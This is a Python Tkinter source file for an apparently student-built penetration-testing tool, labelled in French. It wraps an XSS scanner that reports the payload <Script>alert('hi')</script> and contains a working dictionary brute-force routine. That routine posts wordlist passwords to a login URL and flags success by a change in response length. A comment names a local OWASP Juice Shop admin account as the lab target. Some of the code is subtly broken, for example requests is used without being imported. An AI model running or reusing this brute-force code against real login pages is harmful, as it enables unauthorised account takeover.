from tkinter import *
from tkinter import ttk
import Source.Scripts.xss_scanner as xss_scanner
from PIL import Image, ImageTk
import os

class PentestOWASP(Frame):
	def __init__(self, parent, controller):
		Frame.__init__(self, parent)
		self.configure(background='black')

	
		label = Label(self, text="Scan des vulnerabilités OWASP")
		label.pack(padx=10, pady=10)

		frameXSS = LabelFrame(self, text = "Analyse des injections xss")
		frameXSS.place(x=30,y=30,height=250,width=500)

		labelurlxss = Label(frameXSS, text="Entrez le lien de la page contenant \n un champ de formulaire possiblement vulnérable")
		labelurlxss.pack()

		inputUrl = Entry(frameXSS,width=50)
		inputUrl.pack()

		global labelStartSCan
		labelStartSCan = Label(frameXSS)
		labelStartSCan.pack()

		
		def onClick():
			global labelStartSCan
			labelStartSCan.configure(text="Scan  en cours... ")
			if xss_scanner.scan_xss(inputUrl.get()):
				labelStartSCan.configure(text = "Faille XSS non permanente trouvé !" + "\n" + "Risque elevé" +"\n" + "Attaque utilisé : "+ "<Script>alert('hi')</script>")
			else : 
				labelStartSCan.configure(text = "Faille XSS non trouvé , fin du scan...")
			
		button = Button(frameXSS, text = "Lancer le scan !", command=onClick, bg = "red" , fg = "white")
		button.pack()

		
		
		frameSQL = LabelFrame(self, text = "Analyse des injections sql")
		frameSQL.place(x=1700,y=30,height=250,width=500)
		

		frameBruteForceLogin = LabelFrame(self, text = "Analyse des failles du login")
		frameBruteForceLogin.place(x=30,y=350,height=550,width=500)

		Label_password_found= Label(frameBruteForceLogin, bg='#fff',text = "Le mdp trouvé sera affiché ici")
		Label_password_found.pack()

		#Entrer le lien de la page de login

		Label_login_url = Label(frameBruteForceLogin, text = "Entre le lien de l'url de la requête post du login !")
		Label_login_url.pack()

		

		def show_image(self):
			window = Toplevel()
			image = Image.open("./Source/Images/Explanation_dico_attack.png")
			photo = ImageTk.PhotoImage(image)
			label = Label(window, image=photo)
			label.pack()
			window.mainloop()

		
		label_explanation = Label(frameBruteForceLogin, text="Cliquez pour voir où se trouve le lien de la requête post",foreground="blue", font=("Arial", 14, "underline"))
		label_explanation.bind("<Button-1>",show_image)
		label_explanation.pack()

		login_url = StringVar()
		login_entry = ttk.Entry(frameBruteForceLogin, textvariable=login_url)
		login_entry.pack(fill=X)




		
		
		#Specifier le mail/username

		Label_login = Label(frameBruteForceLogin, text = "Ecriver en toutes lettre si c'est un mail ou username")
		Label_login.pack()

		login= StringVar()
		username= ttk.Entry(frameBruteForceLogin, textvariable=login)
		username.pack()

		Label_login_username = Label(frameBruteForceLogin, text = "Entre le mail/username connu")
		Label_login_username.pack()

		login_username = StringVar()
		username_entry= ttk.Entry(frameBruteForceLogin, textvariable=login_username)
		username_entry.pack(fill=X)

		#Donner la possibilité de choisir le fichier dictionnaire

		Label_choose_dico = Label(frameBruteForceLogin, text = "Choisis le dictionnaire !")
		Label_choose_dico.pack()

	
	
		elements = os.listdir("./Dictionaries")

		choicesvar = StringVar(value=elements)
		l_dicos = Listbox(frameBruteForceLogin, listvariable=choicesvar, exportselection=False)
		l_dicos.pack(fill =Y)
			


		
		#login_url = "http://localhost:3000/rest/user/login"
		#login_username = "admin@juice-sh.op"

		#Implémentation du boutton pour lancer l'attaque par dictionaire

		def dico_attack():
			global file_path
			j= l_dicos.curselection()
			if not "file_path" in locals() or l_dicos.get(j) != file_path[13:len(file_path)-4]:
				if l_dicos.get(j) != "Custom...":
					file_path=l_dicos.get(j)
					file_path="./Dictionaries/"+file_path
			print(file_path)
			Label_password_found.configure(text ='Recherche du mdp en cours')
			
			
			data_null = {login.get():'email', 'password':'password'}
			print(login_url.get)
			response_null = requests.post(login_url.get(),data =data_null)
			len_null = len(response_null.text)
			
			with open(file_path,'r') as f:
				for word in f.readlines():
					password = word.replace("\n","")
					print("password tried :", password)

					data = {login.get():login_username.get(), 'password':password}
					response = requests.post(login_url.get(),data = data)
					if len_null != len(response.text):
						Label_password_found.configure(text ='MDP TROUVE !!!: ' + password)
						return data
						
			Label_password_found.configure(text ='Aucun mdp trouvé :( ')
			return "end of function"

		
		button_launch_dico_attack = Button(frameBruteForceLogin,text="Lancer l'attaque", command=dico_attack)
		button_launch_dico_attack.pack()
'''
		start_page = Button(self, text="Start Page", command=lambda:controller.show_frame(StartPage))
		start_page.pack()
		page_two = Button(self, text="Page Two", command=lambda:controller.show_frame(PageTwo))
		page_two.pack()
		'''
